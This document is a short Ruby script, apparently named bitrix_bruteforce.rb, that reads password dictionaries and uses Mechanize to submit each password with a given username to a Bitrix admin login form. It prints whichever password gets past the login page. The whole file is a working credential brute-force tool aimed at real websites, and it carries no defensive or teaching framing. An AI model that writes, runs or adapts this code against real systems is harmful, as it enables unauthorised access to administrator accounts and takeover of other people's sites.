#!/usr/bin/env ruby

require 'mechanize'
require 'progress_bar'

passes = []
files = []

Dir["dictionaries/**.txt"].each do |file|
  puts file
  File.open(file, "r") do |f|
    while line = f.gets
      passes << line.chomp.chomp
    end
  end

  # let's try to parse!
  begin
    agent = Mechanize.new
    agent.get(ARGV[1])
  rescue ArgumentError, SocketError => e
    puts "Something wrong, use right url!"
    puts "Usage: some_login ./bitrix_bruteforce.rb http://example.com/path/to/admin/panel"
    exit
  end

  # progress bar initialization
  bar = ProgressBar.new(passes.length)

  passes.each_with_index do |pass, index|
    bar.increment!
    form = agent.page.forms.first
    form.USER_LOGIN = ARGV[0]
    form.USER_PASSWORD = pass
    form.submit
    if agent.page.forms.count != 1
      puts pass
      exit
    end
  end
end